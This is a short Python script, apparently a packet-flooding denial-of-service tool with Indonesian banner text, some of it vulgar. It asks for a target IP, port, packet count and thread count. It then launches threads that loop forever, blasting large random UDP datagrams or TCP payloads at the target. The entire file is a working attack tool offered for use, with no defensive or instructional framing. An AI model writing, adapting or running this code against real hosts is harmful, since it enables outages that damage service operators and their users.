#Autor By Cyber
import random
import socket
import threading
import os

os.system("clear")
print("#-- TOOS BY REXX --#")
print("--> INI TOOLS GK OP KONTOL KLO MAU OP MAKANYA GANTENG <--")
print("#-- SUBSCRIBE ReXx --#")
ip = str(input(" Masukan IP:"))
port = int(input(" Port:"))
choice = str(input(" Gas Attack ?(Gas/Gk):"))
times = int(input(" Mau Berapa Packets?:"))
threads = int(input(" Isi Packets Threads?:"))
def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" OAstroboy!!!")
		except:
			print("[!] Astroboy!!!")

def run2():
	data = random._urandom(696969)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" REXX!!!")
		except:
			s.close()
			print("[*] OFF NGETOD")

for y in range(threads):
	if choice == 'Gas':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()